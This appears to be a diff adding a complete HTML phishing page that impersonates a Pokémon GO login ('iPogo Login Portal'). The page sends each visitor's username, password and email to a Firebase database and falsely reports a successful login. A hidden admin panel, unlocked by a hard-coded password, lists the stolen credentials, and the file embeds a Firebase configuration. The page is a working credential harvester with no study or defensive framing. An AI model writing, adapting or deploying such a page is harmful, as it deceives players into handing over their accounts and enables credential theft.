@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>iPogo Login Portal (with Firebase)</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f9f9f9; padding: 20px; }
+    .container { max-width: 600px; margin: auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    h2 { text-align: center; color: #e3350d; }
+    .form-group { margin-bottom: 15px; }
+    label { display: block; margin-bottom: 5px; }
+    input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; }
+    .btn { width: 100%; padding: 10px; background: #e3350d; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+    .btn:hover { background: #c12a0b; }
+    #adminPanel { display: none; margin-top: 40px; }
+    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+    th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
+    th { background: #e3350d; color: white; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Pokémon GO Login</h2>
+    <div id="loginForm">
+      <div class="form-group">
+        <label>Username</label>
+        <input type="text" id="username" />
+      </div>
+      <div class="form-group">
+        <label>Password</label>
+        <input type="password" id="password" />
+      </div>
+      <div class="form-group">
+        <label>Email</label>
+        <input type="email" id="email" />
+      </div>
+      <button class="btn" onclick="saveCredentials()">Login</button>
+    </div>
+
+    <div style="margin-top: 30px;">
+      <label><strong>Admin Password:</strong></label>
+      <input type="password" id="adminPassword" />
+      <button class="btn" style="margin-top:10px" onclick="checkAdmin()">View Admin Panel</button>
+    </div>
+
+    <div id="adminPanel">
+      <h3>Stored Credentials</h3>
+      <table>
+        <thead>
+          <tr><th>Username</th><th>Password</th><th>Email</th><th>Time</th></tr>
+        </thead>
+        <tbody id="credTable"></tbody>
+      </table>
+      <button class="btn" style="background:#555;margin-top:20px" onclick="clearAll()">Delete All</button>
+    </div>
+  </div>
+
+  <!-- Firebase Scripts -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+
+  <script>
+    // Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyDww9woXWjws5IXsNuuedCsnL1QOnH2xII",
+      authDomain: "ipogo-3d1d6.firebaseapp.com",
+      databaseURL: "https://ipogo-3d1d6-default-rtdb.firebaseio.com",
+      projectId: "ipogo-3d1d6",
+      storageBucket: "ipogo-3d1d6.firebasestorage.app",
+      messagingSenderId: "623421100612",
+      appId: "1:623421100612:web:20d6602fbece9b25e8a211",
+      measurementId: "G-BZCRV70CP4"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    function saveCredentials() {
+      const uname = document.getElementById('username').value;
+      const pass = document.getElementById('password').value;
+      const email = document.getElementById('email').value;
+      const time = new Date().toLocaleString();
+
+      if (!uname || !pass || !email) return alert('Please fill all fields.');
+
+      const ref = db.ref('credentials');
+      ref.push({ uname, pass, email, time });
+
+      alert("Login successful! You may now close this tab.");
+    }
+
+    function checkAdmin() {
+      const pwd = document.getElementById('adminPassword').value;
+      const year = new Date().getFullYear();
+      if (pwd === 'ipogo' + year + '!Secure') {
+        document.getElementById('adminPanel').style.display = 'block';
+        loadCredentials();
+      } else {
+        alert("Incorrect admin password.");
+      }
+    }
+
+    function loadCredentials() {
+      const table = document.getElementById('credTable');
+      table.innerHTML = '';
+
+      db.ref('credentials').once('value', snapshot => {
+        snapshot.forEach(child => {
+          const c = child.val();
+          const row = `<tr><td>${c.uname}</td><td>${c.pass}</td><td>${c.email}</td><td>${c.time}</td></tr>`;
+          table.innerHTML += row;
+        });
+      });
+    }
+
+    function clearAll() {
+      if (confirm('Clear all saved data?')) {
+        db.ref('credentials').remove().then(() => loadCredentials());
+      }
+    }
+  </script>
+</body>
+</html>
